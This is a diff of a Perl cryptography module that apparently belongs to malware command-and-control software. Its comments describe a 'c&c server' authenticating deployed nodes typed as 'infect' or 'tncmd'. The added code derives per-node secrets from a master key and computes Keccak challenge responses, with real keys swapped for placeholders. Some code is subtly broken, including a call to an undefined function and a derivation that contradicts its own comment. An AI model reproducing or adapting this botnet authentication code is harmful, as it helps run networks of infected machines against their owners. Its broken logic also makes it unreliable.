@@ -21,10 +21,10 @@ package bm::crypto;
 
 use strict;
 
-use Math::GMP;
-use Digest::SHA;
-use Crypt::PK::ECC;
-use Crypt::Rijndael;
+use Digest::SHA       ();
+use Digest::KeccakOld ();
+use Crypt::PK::ECC    ();
+use Crypt::Rijndael   ();
 
 my $prngc;
 my $prngi = 0;
@@ -54,29 +54,83 @@ sub ecdsa_sign($)
 	scalar reverse pack "a32 a32", (scalar reverse $s), (scalar reverse $r);
 }
 
-my $N = 3328;
-my $n = Math::GMP->new(
-	'U4qM5d1Fp7hFNsmBbGRejbcTa9XOnvz1zKys4lBto8Ho1Me8dzlyNre1tOQQ50nnw9XLEOAvpqr4z2nFobDnG5xn5hvRDasKhBKF2rcM58o71QBv8E4MS2rWbAMK6KFVMGhiwRst0yWPKxrcjN65kcUjgCvUD0T3g5ac1lMVMgSVg6F7YnZRiTEAUxOC5H8ElgpOTX9AQXenXmRt87DI5qFKF6S9bo2GOFhkAvQ3UxmNxdkMmALusPUSI70KhqhtbaBcX2YJ76Zoi8S2Nsu0MKZivQrpqGoWzE639miDsk9UVj4JYaUVhCJXFr9Hd4hWjuVWTLOHnF5mArSK1CUuQWfBn3KOZPjxw5EOD8dfxNGDC45oIcfRlNitMM1n5gVGvj8EsmMH6JL1mQPvhIupVNH9inu2DB5xoJb9w6q3kDWPtbOjt8m6qgcmDZiSaKnHqaeo41bQAwSSKjrRh0bxRKQiOU2cKhRHbBzkvHOO9DDCuaj4XH8NBnsvZe4z098bYUoLHRx1po1BouqddrifLzZFpG9r5QsAAMp9DH7swhYMWGP',
-	62
-);
-my $d = Math::GMP->new('not-the-real-rsa-key', 62);
+my $TNKEY_FIXED = pack "H*", "not-the-real-secret";
+my $TNKEY_NODE  = pack "H*", "not-the-real-secret";
+my $TNKEY_TYPE  = pack "H*", "not-the-real-secret";
 
-sub rsa_sign($)
+# tn's out there have an id and shared secret that
+# is unique to each one. the challenge response protocol works
+# by sending a random 32 byte string, the id,
+# and expects keccak(challange . id . secret)
+# server needs to know the secret.
+#
+# this can be accomplished in a variety of ways
+# the secret can be in the database, or it can be
+# derived from the id, using a secret key:
+# keccak($KEY_FIXED . keccak(secret . $KEY_FIXED))
+# the key, obviously, is only known to the c&c server
+# the tn component receives the resulting secret as commandline argument
+#
+# the first byte of keccak(id . $KEY_TYPE) also encodes a type
+# 1 - serinfect, infect
+# 2 - tnr upgraded
+# 3 - tncmd
+
+sub tn_gensecret($)
 {
-	my ($m) = @_;
+	my ($id) = @_;
 
-	$m = Digest::SHA::sha256($m);
+	$id = Digest::KeccakOld::sha3_256 $id . $TNKEY_FIXED;
+	$id = Digest::KeccakOld::sha3_256 $TNKEY_FIXED . $id;
 
-	my $p = randbytes($N - 256) / 8;
+	$id
+}
 
-	(vec $p, 7, 1) = 0;
-	(vec $p, 6, 1) = 1;
+sub tn_gencreds(;$)
+{
+	my ($type) = @_;
 
-	my $h = $p . Digest::SHA::sha256("$p$m");
-	$h = Math::GMP->new((unpack "H*", $h), 16);
+	my $id0 = bm::crypto::randbytes 32;
+	my $c;
 
-	my $s = Math::GMP::powm_gmp($h, $d, $n);
-	pack "H" . ($N / 4), scalar reverse Math::GMP::get_str_gmp $s, 16;
+	while () {
+		my $id = $id0 ^ pack "N", $c;
+
+		return ($id, gensecret $id)
+			if $type == ord Digest::KeccakOld::sha3_256 $id . $TNKEY_TYPE;
+
+		++$c;
+	}
+}
+
+# get secret for id
+sub tn_secret($)
+{
+	my ($id) = @_;
+
+	my ($key, $secret);
+
+	#	if (defined (my $secret1 = sql_fetch "select secret1 from node where id = ?", $id)) {
+	#		$key = $TNKEY_NODE;
+	#		$secret = $secret1;
+	#	} else {
+	$key    = $TNKEY_FIXED;
+	$secret = $id;
+
+	#	}
+
+	$secret = Digest::KeccakOld::sha3_256 $secret . $key;
+	$secret = Digest::KeccakOld::sha3_256 $key . $secret;
+
+	$secret
+}
+
+sub tn_response
+{
+	my ($id, $chg) = @_;
+
+	my $secret = tn_secret $id;
+	Digest::KeccakOld::sha3_256 "$chg$id$secret";
 }
 
 1
